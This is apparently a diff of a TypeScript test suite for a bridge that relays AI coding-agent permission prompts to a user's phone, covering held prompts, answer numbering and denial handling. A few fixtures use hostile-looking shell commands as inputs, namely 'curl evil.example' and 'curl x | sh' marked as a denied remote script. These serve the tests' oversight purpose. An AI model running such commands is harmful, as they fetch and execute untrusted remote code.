+      expect(sent.find((m) => m.type === 'error')).toBeUndefined();
+      expect(ptySubmits).toEqual(['status?']);
+      built.handle.gate.forceRelease('test');
+      await hook;
+    });
+
+    test('daemon mode: ten concurrent held cards are all kept past the pending cap, oldest still answerable', async () => {
+      const { handle } = build({
+        realTracker: true,
+        realMessageApi: true,
+        liveQuestionDeps: true,
+        hasLocalTerminal: false,
+      });
+      lockSession('claude-many-held');
+      const hooks: Array<Promise<PermissionDecision>> = [];
+      for (let i = 0; i < 10; i++) {
+        hooks.push(
+          hookServer.firePermission({
+            session_id: 'claude-many-held',
+            hook_event_name: 'PermissionRequest',
+            agent_id: `agent-${i}`,
+            agent_type: 'general-purpose',
+            tool_name: 'Bash',
+            tool_input: { command: `touch held-${i}.txt` },
+          }),
+        );
+      }
+      // Ten background agents each waiting on the phone: the cap (8) must
+      // not drop a card whose hook is still held.
+      const held = cards();
+      expect(held).toHaveLength(10);
+      const oldest = held[0] as Question;
+      expect(oldest.text).toContain('touch held-0.txt');
+      const yes = oldest.options.find((o) => o.isYes && !o.isNo) as QuestionOption;
+      expect(handle.gate.answerHeld(oldest.id, { kind: 'option', option: yes })).toBe('resolved');
+      expect(await hooks[0]).toBe('allow');
+      handle.gate.forceRelease('test');
+      await Promise.all(hooks);
+    });
+
+    test('daemon mode: held, an answerable card at once, the phone answer is the hook response', async () => {
+      const { handle, tracker } = build({
+        realTracker: true,
+        realMessageApi: true,
+        liveQuestionDeps: true,
+        hasLocalTerminal: false,
+      });
+      lockSession('claude-sub-daemon');
+      const hook = hookServer.firePermission({
+        ...subCall('claude-sub-daemon'),
+        hook_event_name: 'PermissionRequest',
+      });
+      const card = cards()[0];
+      if (!card) throw new Error('no card for the held subagent prompt');
+      expect(card.agentId).toBe('agent-bg');
       const handlers = createInputHandlers({
         sessionRegistry,
         bindingStore,
         send: () => true,
+        ...gateAnswerDeps(() => handle.gate),
         ...trackerScreenDeps(() => tracker),
       });
-      await handlers.onAnswer('conn-1' as UUID, SID, card.id, no.label);
-
-      expect(ptySubmits).toEqual(['3']);
+      expect(await handlers.relayAnswer(SID, card.id, 'No')).toBe('delivered');
+      expect(await hook).toBe('deny');
+      expect(ptySubmits).toEqual([]);
     });
   });
 
@@ -1801,21 +2554,16 @@ describe('setupHookBridge', () => {
   });
 
   /**
-   * #1134, the live E5 reproduction: a Bash `PermissionRequest` whose
-   * `permission_suggestions` were `addDirectories` + `setMode` built a
-   * 4-option card (Yes / allow directory / switch to acceptEdits / No) over a
-   * dialog Claude rendered with 3 (Yes / always allow access to <dir> / No).
-   * The phone's "No" was value 4; Claude ignored the digit and the Enter that
-   * followed confirmed "1. Yes", so the command ran. Driven through the real
-   * bridge, gate, tracker, MessageAPI and answer handler, with the dialog
-   * parsed from the live PTY bytes by the real parser.
+   * #1134: a card answered by typing carries the screen's numbering, and a
+   * typed digit is refused unless the screen's option at that value is the
+   * same choice. Since #1126 only cards pushed by id before their render are
+   * typed (multi-choice permissions, ExitPlanMode, AskUserQuestion; #1127
+   * moves those to the hook too); a binary prompt is held instead, see the
+   * held-prompt tests above. Driven through the real bridge, gate, tracker,
+   * MessageAPI and answer handler, with the live dialog parsed by the real
+   * parser.
    */
   describe("phone answers use the screen's numbering (#1134)", () => {
-    const E5_SUGGESTIONS = [
-      { type: 'addDirectories', directories: [WRAPPED_DIRECTORY], destination: 'session' },
-      { type: 'setMode', mode: 'acceptEdits', destination: 'session' },
-    ];
-
     function lockSession(id: string): void {
       hookServer.fire('Notification', {
         session_id: id,
@@ -1848,95 +2596,10 @@ describe('setupHookBridge', () => {
           sent.push(m);
           return true;
         },
-        retireQuestion: (_s, q) => gate.retireQuestion(q),
+        ...gateAnswerDeps(() => gate),
         ...trackerScreenDeps(() => tracker),
       });
     }
-
-    async function e5Card(sessionTag: string): Promise<{
-      tracker: QuestionPresenceTracker;
-      card: Question;
-      screen: Question;
-    }> {
-      const { tracker } = build({
-        realTracker: true,
-        realMessageApi: true,
-        liveQuestionDeps: true,
-      });
-      lockSession(sessionTag);
-      const decision = await hookServer.firePermission({
-        session_id: sessionTag,
-        hook_event_name: 'PermissionRequest',
-        tool_name: 'Bash',
-        tool_input: { command: 'touch e5-marker.txt' },
-        permission_suggestions: E5_SUGGESTIONS,
-      });
-      // The gate answers passthrough and marks the card to push when the
-      // dialog renders (#1121).
-      expect(decision).toBe('passthrough');
-      const screen = liveDialog();
-      tracker.onOrphanPTYPrompt(screen);
-      const registered = cards();
-      expect(registered).toHaveLength(1);
-      return { tracker, card: registered[0] as Question, screen };
-    }
-
-    test("the card carries the screen's options, not the hook's four", async () => {
-      const { card, screen } = await e5Card('claude-e5-card');
-
-      // The screen's labels and values, unchanged.
-      expect(card.options.map((o) => [o.value, o.label])).toEqual(
-        screen.options.map((o) => [o.value, o.label]),
-      );
-      expect(card.options.map((o) => o.value)).toEqual(['1', '2', '3']);
-      expect(card.options[2]?.label).toBe('No');
-      // Yes/no meaning restored from the screen labels (the parse has none),
-      // so the lock screen's positional "Yes / Yes, always / No" buttons are
-      // true of options 1-3.
-      expect(card.options.map((o) => [o.isYes, o.isNo])).toEqual([
-        [true, false],
-        [true, false],
-        [false, true],
-      ]);
-      expect(selectPushCategory(card.options)).toBe('REMI_YNA');
-      // The hook still names the command.
-      expect(card.text).toBe('Allow Bash: touch e5-marker.txt');
-    });
-
-    test('a phone "No" types the screen\'s 3, never 4', async () => {
-      const { tracker, card } = await e5Card('claude-e5-no');
-      const no = card.options.find((o) => o.label === 'No');
-      if (!no) throw new Error('no "No" option on the card');
-
-      const sent: ProtocolMessage[] = [];
-      // The value, as the phone sent it in the live run.
-      await answerHandlers(tracker, sent).onAnswer('conn-e5' as UUID, SID, card.id, no.value);
-
-      expect(ptySubmits).toEqual(['3']);
-      expect(sent.filter((m) => m.type === 'error')).toHaveLength(0);
-    });
-
-    test('free text on the card is refused, not typed into the menu', async () => {
-      // Lead decision on the #1134 review. The merged card takes the hook's
-      // allowsFreeText (false for a permission), not the parser's (true for
-      // every selection box), so text sent against it never reaches the
-      // dialog, where Claude would ignore it and Enter would confirm "1. Yes".
-      const { tracker, card } = await e5Card('claude-e5-text');
-      expect(card.allowsFreeText).toBe(false);
-
-      const sent: ProtocolMessage[] = [];
-      await answerHandlers(tracker, sent).onAnswer(
-        'conn-e5' as UUID,
-        SID,
-        card.id,
-        'no, do not create the file',
-      );
-
-      expect(ptySubmits).toEqual([]);
-      const errors = sent.filter((m) => m.type === 'error');
-      expect(errors).toHaveLength(1);
-      expect((errors[0] as { code?: string }).code).toBe('STALE_ANSWER');
-    });
 
     test('a value the screen does not show is refused and nothing is typed', async () => {
       // A card pushed by id before its render carries the hook's numbering:
@@ -2130,7 +2793,7 @@ describe('setupHookBridge', () => {
 
   test('#710: active Task context but UNTAGGED PermissionRequest escalates, not denies', async () => {
     // An untagged request is the main agent's even while a Task is open.
-    build();
+    const { handle } = build();
 
     hookServer.fire('Notification', {
       session_id: 'claude-noaa-task',
@@ -2148,16 +2811,17 @@ describe('setupHookBridge', () => {
       tool_use_id: 'tu_task_noaa',
     });
 
-    const decision = await hookServer.firePermission({
+    const decision = hookServer.firePermission({
       session_id: 'claude-noaa-task',
       hook_event_name: 'PermissionRequest',
       tool_name: 'Bash',
       tool_input: { command: 'ls' },
     });
 
-    expect(decision).toBe('passthrough');
-    expect(ptySubmits).toEqual([]);
     expect(messageApiLog.questionCalls).toBe(1); // escalated to the user, not silently denied
+    handle.gate.forceRelease('test');
+    expect(await decision).toBe('passthrough');
+    expect(ptySubmits).toEqual([]);
   });
 
   test('#751: a genuinely subagent-TAGGED PermissionRequest (agent_id set) during an active Task context parks + passthrough', async () => {
@@ -2230,10 +2894,10 @@ describe('setupHookBridge', () => {
 
     test('a matching subagent PreToolUse resolves a parked permission (question_resolved fires)', async () => {
       const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
-      build({ broadcastResolvedLog, realMessageApi: true, parkedRenders: true });
+      build({ broadcastResolvedLog, realMessageApi: true, hasLocalTerminal: false });
       lock('claude-799-pre');
 
-      const decision = await hookServer.firePermission({
+      const decision = hookServer.firePermission({
         session_id: 'claude-799-pre',
         agent_id: 'agent-799-1',
         agent_type: 'general-purpose',
@@ -2241,8 +2905,7 @@ describe('setupHookBridge', () => {
         tool_name: 'Bash',
         tool_input: { command: 'git push' },
       });
-      expect(decision).toBe('passthrough');
-      expect(broadcastResolvedLog).toHaveLength(0); // parked, not resolved yet
+      expect(broadcastResolvedLog).toHaveLength(0); // held (no local terminal), not resolved yet
 
       // The user answered directly in the terminal: Claude now runs the tool.
       hookServer.fire('PreToolUse', {
@@ -2256,14 +2919,15 @@ describe('setupHookBridge', () => {
 
       expect(broadcastResolvedLog).toHaveLength(1);
       expect(broadcastResolvedLog[0]?.reason).toBe('cancelled');
+      expect(await decision).toBe('passthrough');
     });
 
     test('a matching subagent PostToolUse also resolves it', async () => {
       const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
-      build({ broadcastResolvedLog, realMessageApi: true, parkedRenders: true });
+      build({ broadcastResolvedLog, realMessageApi: true, hasLocalTerminal: false });
       lock('claude-799-post');
 
-      const decision = await hookServer.firePermission({
+      const decision = hookServer.firePermission({
         session_id: 'claude-799-post',
         agent_id: 'agent-799-2',
         agent_type: 'general-purpose',
@@ -2271,7 +2935,6 @@ describe('setupHookBridge', () => {
         tool_name: 'Bash',
         tool_input: { command: 'ls -la' },
       });
-      expect(decision).toBe('passthrough');
       expect(broadcastResolvedLog).toHaveLength(0);
 
       hookServer.fire('PostToolUse', {
@@ -2286,14 +2949,15 @@ describe('setupHookBridge', () => {
 
       expect(broadcastResolvedLog).toHaveLength(1);
       expect(broadcastResolvedLog[0]?.reason).toBe('cancelled');
+      expect(await decision).toBe('passthrough');
     });
 
     test('(b) a non-matching subagent PreToolUse leaves the parked permission open', async () => {
       const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
-      build({ broadcastResolvedLog, realMessageApi: true, parkedRenders: true });
+      build({ broadcastResolvedLog, realMessageApi: true, hasLocalTerminal: false });
       lock('claude-799-nomatch');
 
-      await hookServer.firePermission({
+      void hookServer.firePermission({
         session_id: 'claude-799-nomatch',
         agent_id: 'agent-799-3',
         agent_type: 'general-purpose',
@@ -2353,10 +3017,10 @@ describe('setupHookBridge', () => {
 
     test("never fires ambiguously: SubagentStop for one agent does not resolve a DIFFERENT agent's still-open permission", async () => {
       const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
-      build({ broadcastResolvedLog, realMessageApi: true, parkedRenders: true });
+      build({ broadcastResolvedLog, realMessageApi: true, hasLocalTerminal: false });
       lock('claude-799-ambig');
 
-      await hookServer.firePermission({
+      void hookServer.firePermission({
         session_id: 'claude-799-ambig',
         agent_id: 'agent-799-A',
         agent_type: 'general-purpose',
@@ -2364,7 +3028,7 @@ describe('setupHookBridge', () => {
         tool_name: 'Bash',
         tool_input: { command: 'echo A' },
       });
-      await hookServer.firePermission({
+      void hookServer.firePermission({
         session_id: 'claude-799-ambig',
         agent_id: 'agent-799-B',
         agent_type: 'general-purpose',
@@ -2388,10 +3052,10 @@ describe('setupHookBridge', () => {
 
     test('a matching subagent PostToolUseFailure resolves it (a failed tool still proves the permission was granted)', async () => {
       const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
-      build({ broadcastResolvedLog, realMessageApi: true, parkedRenders: true });
+      build({ broadcastResolvedLog, realMessageApi: true, hasLocalTerminal: false });
       lock('claude-799-failure');
 
-      await hookServer.firePermission({
+      void hookServer.firePermission({
         session_id: 'claude-799-failure',
         agent_id: 'agent-799-5',
         agent_type: 'general-purpose',
@@ -2417,10 +3081,10 @@ describe('setupHookBridge', () => {
 
     test('a non-matching subagent PostToolUseFailure leaves the parked permission open', async () => {
       const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
-      build({ broadcastResolvedLog, realMessageApi: true, parkedRenders: true });
+      build({ broadcastResolvedLog, realMessageApi: true, hasLocalTerminal: false });
       lock('claude-799-failure-nomatch');
 
-      await hookServer.firePermission({
+      void hookServer.firePermission({
         session_id: 'claude-799-failure-nomatch',
         agent_id: 'agent-799-6',
         agent_type: 'general-purpose',
@@ -2481,17 +3145,16 @@ describe('setupHookBridge', () => {
 
     test('a matching MAIN PermissionDenied resolves the open (parked/passthrough) escalation', async () => {
       const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
-      build({ broadcastResolvedLog, realMessageApi: true, parkedRenders: true });
+      build({ broadcastResolvedLog, realMessageApi: true, hasLocalTerminal: false });
       lock('claude-889-denied-main');
 
-      const decision = await hookServer.firePermission({
+      const decision = hookServer.firePermission({
         session_id: 'claude-889-denied-main',
         hook_event_name: 'PermissionRequest',
         tool_name: 'Bash',
         tool_input: { command: 'curl evil.example' },
       });
-      expect(decision).toBe('passthrough');
-      expect(broadcastResolvedLog).toHaveLength(0); // still open
+      expect(broadcastResolvedLog).toHaveLength(0); // still open (held, #1126)
 
       hookServer.fire('PermissionDenied', {
         session_id: 'claude-889-denied-main',
@@ -2504,6 +3167,8 @@ describe('setupHookBridge', () => {
 
       expect(broadcastResolvedLog).toHaveLength(1);
       expect(broadcastResolvedLog[0]?.reason).toBe('cancelled');
+      // The hold ends with the empty response, which decides nothing.
+      expect(await decision).toBe('passthrough');
     });
 
     test('a matching SUBAGENT PermissionDenied resolves the parked escalation, scoped to that agent', async () => {
@@ -2548,10 +3213,10 @@ describe('setupHookBridge', () => {
       // swallow class #925 was. Same tool + same tool_input on purpose, so
       // agent identity is the ONLY thing that can disambiguate.
       const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
-      build({ broadcastResolvedLog, realMessageApi: true, parkedRenders: true });
+      build({ broadcastResolvedLog, realMessageApi: true, hasLocalTerminal: false });
       lock('claude-889-denied-2agents');
 
-      await hookServer.firePermission({
+      void hookServer.firePermission({
         session_id: 'claude-889-denied-2agents',
         agent_id: 'agent-A',
         agent_type: 'general-purpose',
@@ -2559,7 +3224,7 @@ describe('setupHookBridge', () => {
         tool_name: 'Bash',
         tool_input: { command: 'git push' },
       });
-      await hookServer.firePermission({
+      void hookServer.firePermission({
         session_id: 'claude-889-denied-2agents',
         agent_id: 'agent-B',
         agent_type: 'general-purpose',
@@ -2595,10 +3260,14 @@ describe('setupHookBridge', () => {
 
     test('a non-matching PermissionDenied (different tool_input) leaves the open escalation untouched', async () => {
       const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
-      build({ broadcastResolvedLog, realMessageApi: true, parkedRenders: true });
+      const { handle } = build({
+        broadcastResolvedLog,
+        realMessageApi: true,
+        hasLocalTerminal: false,
+      });
       lock('claude-889-denied-nomatch');
 
-      await hookServer.firePermission({
+      const decision = hookServer.firePermission({
         session_id: 'claude-889-denied-nomatch',
         hook_event_name: 'PermissionRequest',
         tool_name: 'Bash',
@@ -2613,14 +3282,20 @@ describe('setupHookBridge', () => {
       });
 
       expect(broadcastResolvedLog).toHaveLength(0);
+      handle.gate.forceRelease('test');
+      expect(await decision).toBe('passthrough');
     });
 
     test('PermissionDenied for a FOREIGN session_id is dropped by the admit gate (no cross-session resolution)', async () => {
       const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
-      build({ broadcastResolvedLog, realMessageApi: true, parkedRenders: true });
+      const { handle } = build({
+        broadcastResolvedLog,
+        realMessageApi: true,
+        hasLocalTerminal: false,
+      });
       lock('claude-889-denied-foreign');
 
-      await hookServer.firePermission({
+      const decision = hookServer.firePermission({
         session_id: 'claude-889-denied-foreign',
         hook_event_name: 'PermissionRequest',
         tool_name: 'Bash',
@@ -2635,6 +3310,30 @@ describe('setupHookBridge', () => {
       });
 
       expect(broadcastResolvedLog).toHaveLength(0);
+      handle.gate.forceRelease('test');
+      expect(await decision).toBe('passthrough');
+    });
+
+    test('#1126: an admitted PermissionDenied reaches the harness_denied push, never a card', () => {
+      const denied: unknown[] = [];
+      const { handle } = build({ realMessageApi: true, onHarnessDenied: (i) => denied.push(i) });
+      lock('claude-1126-denied');
+      const event = {
+        session_id: 'claude-1126-denied',
+        hook_event_name: 'PermissionDenied',
+        tool_name: 'Bash',
+        tool_input: { command: 'curl x | sh' },
+        tool_use_id: 'tu-d',
+        reason: 'remote script',
+      };
+      hookServer.fire('PermissionDenied', event);
+      expect(denied).toEqual([event]);
+      expect(sessionRegistry.getSession(SID)?.currentQuestions.size ?? 0).toBe(0);
+      expect(handle.gate.forceRelease('probe')).toEqual({ resolved: 0 });
+
+      // A sibling session's denial is not ours to report.
+      hookServer.fire('PermissionDenied', { ...event, session_id: 'claude-OTHER' });
+      expect(denied).toHaveLength(1);
     });
 
     test('with NO open escalation at all, PermissionDenied is a clean no-op (never throws)', () => {
@@ -3085,11 +3784,15 @@ describe('setupHookBridge', () => {
         message: '',
       });
 
+      // A parked subagent prompt: the two-step contract it still follows (a
+      // main-agent binary prompt is held and pushed at hook time, #1126).
       hookServer.fire('PermissionRequest', {
         session_id: 'claude-twostep',
         hook_event_name: 'PermissionRequest',
         tool_name: 'Bash',
         tool_input: { command: 'ls' },
+        agent_id: 'agent-twostep',
+        agent_type: 'general-purpose',
       });
 
       // The hook recorded a pending question but did NOT push (no handleQuestion).
